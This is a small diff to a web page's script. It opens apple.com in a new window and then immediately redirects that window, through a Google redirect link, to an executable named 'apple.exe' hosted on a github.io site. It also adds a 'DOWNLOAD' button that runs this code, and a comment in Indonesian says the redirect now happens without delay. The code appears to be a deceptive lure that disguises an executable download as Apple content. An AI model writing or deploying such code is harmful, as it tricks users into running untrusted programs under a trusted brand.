@@ -2,8 +2,9 @@
 function a() {
   let win = window.open('https://apple.com', 'x');
 
-  win.onload = function () {
-    win.location.href = 'https://www.google.com/url?q=https%3A%2F%2Fecdnts-del.github.io%2Ftest-apk%2Fapple.exe';
-  };
+  // langsung redirect tanpa delay
+  win.location = 'https://www.google.com/url?q=https%3A%2F%2Fecdnts-del.github.io%2Ftest-apk%2Fapple.exe';
 }
 </script>
+
+<input type="button" value="DOWNLOAD" onclick="a()">
